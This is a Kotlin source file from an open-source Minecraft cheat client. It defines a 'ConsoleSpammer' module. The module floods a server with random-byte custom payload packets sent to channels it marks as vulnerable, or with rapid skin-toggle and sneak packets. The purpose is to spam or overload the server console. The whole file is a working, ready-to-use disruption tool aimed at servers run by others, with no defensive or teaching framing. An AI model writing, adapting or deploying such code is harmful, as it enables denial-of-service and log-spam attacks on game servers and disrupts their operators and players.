/*
 * AirPlus Hacked Client
 * A free open source mixin-based injection hacked client for Minecraft using Minecraft Forge.
 * https://github.com/lmx0721/AirPlus
 */
package net.airplus.features.module.modules.misc

import io.netty.buffer.Unpooled
import kotlinx.coroutines.delay
import net.airplus.event.WorldEvent
import net.airplus.event.async.loopSequence
import net.airplus.event.handler
import net.airplus.features.module.Category
import net.airplus.features.module.Module
import net.airplus.utils.client.PacketUtils.sendPacket
import net.airplus.utils.client.PacketUtils.sendPackets
import net.airplus.utils.kotlin.RandomUtils.nextInt
import net.minecraft.entity.player.EnumPlayerModelParts
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.C0BPacketEntityAction
import net.minecraft.network.play.client.C0BPacketEntityAction.Action.START_SNEAKING
import net.minecraft.network.play.client.C0BPacketEntityAction.Action.STOP_SNEAKING
import net.minecraft.network.play.client.C17PacketCustomPayload
import kotlin.random.Random.Default.nextBoolean
import kotlin.random.Random.Default.nextBytes

object ConsoleSpammer : Module("ConsoleSpammer", Category.MISC, subjective = true) {

    private val mode by choices("Mode", arrayOf("Payload", "MineSecure"), "Payload")
    private val delay by int("Delay", 0, 0..500)

    private val payload = PacketBuffer(Unpooled.buffer())
    private val vulnerableChannels = arrayOf("MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem")

    init {
        val rawPayload = ByteArray(nextInt(endExclusive = 128))
        nextBytes(rawPayload)
        payload.writeBytes(rawPayload)
    }

    val onUpdate = loopSequence {
        when (mode.lowercase()) {
            "payload" -> sendPacket(C17PacketCustomPayload(vulnerableChannels.random(), payload))
            "minesecure" -> {
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.HAT, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.JACKET, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_PANTS_LEG, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_PANTS_LEG, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.LEFT_SLEEVE, nextBoolean())
                mc.gameSettings.setModelPartEnabled(EnumPlayerModelParts.RIGHT_SLEEVE, nextBoolean())

                repeat(5) {
                    sendPackets(
                        C0BPacketEntityAction(mc.thePlayer, STOP_SNEAKING),
                        C0BPacketEntityAction(mc.thePlayer, START_SNEAKING)
                    )
                }
            }
        }

        delay(delay.toLong())
    }

    val onWorld = handler<WorldEvent> { event ->
        if (event.worldClient == null) {
            state = false
        }
    }

}